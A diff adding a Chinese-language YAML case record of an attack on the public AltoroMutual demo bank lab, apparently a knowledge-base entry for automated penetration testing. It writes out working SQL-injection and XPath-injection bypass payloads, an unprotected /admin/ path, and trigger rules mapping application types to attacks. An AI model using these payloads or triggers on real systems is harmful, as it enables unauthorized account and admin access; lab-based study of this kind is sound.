@@ -1,0 +1,57 @@
+# 案例: AltoroMutual 银行靶场
+# 日期: 2026-07-21
+# 目标: http://demo.testfire.net
+# 类型: 公开靶场 / 银行业务Web应用
+
+target:
+  url: "http://demo.testfire.net"
+  type: lab
+  name: "AltoroMutual Banking Demo"
+  tech_stack:
+    - "ASP.NET (aspx)"
+    - "Java Servlet (JSESSIONID)"
+    - "静态登录表单"
+  ports: [80]
+  fingerprint:
+    platform: "ASP.NET + Java 混合"
+    session: "JSESSIONID"
+    login_endpoint: "/bank/login.aspx"
+    admin_panel: "/admin/"
+
+attack_surface:
+  - "/bank/login.aspx (POST) - 登录 (SQLi)"
+  - "/bank/queryxpath.aspx (POST) - 搜索 (XPath注入)"
+  - "/admin/ (GET) - 管理面板"
+  - "/bank/ (GET) - 银行业务功能"
+
+techniques_tried:
+  - technique: "万能密码 SQLi 登录"
+    result: "success"
+    detail: "uid=admin' OR '1'='1 → 登录成功, 获取 JSESSIONID"
+  - technique: "XPath 注入搜索"
+    result: "success"
+    detail: "query=test' OR '1'='1 → 搜索返回结果"
+  - technique: "管理面板访问"
+    result: "success"
+    detail: "/admin/ HTTP 200 可访问"
+
+success_path:
+  - step: 1
+    action: "POST /bank/login.aspx uid=admin' OR '1'='1&passw=test"
+    finding: "绕过登录, 获取完整会话"
+  - step: 2
+    action: "XPath注入: /bank/queryxpath.aspx query=test' OR '1'='1"
+    finding: "搜索功能存在注入"
+  - step: 3
+    action: "直接访问 /admin/"
+    finding: "管理面板未保护"
+
+techniques_learned:
+  - "ASP.NET 登录表单: 万能密码 ' OR '1'='1 直接有效"
+  - "XPath 注入: 与 SQLi 类似, ' OR '1'='1 同样适用"
+  - "管理面板: .aspx 应用常见 /admin/ 目录"
+
+fingerprint_triggers:
+  - "ASP.NET 登录 → 测试 ' OR '1'='1 万能密码"
+  - "搜索功能 → XPath/SQL 注入探测"
+  - ".aspx 应用 → 检查 /admin/ /manager/ /backup/"
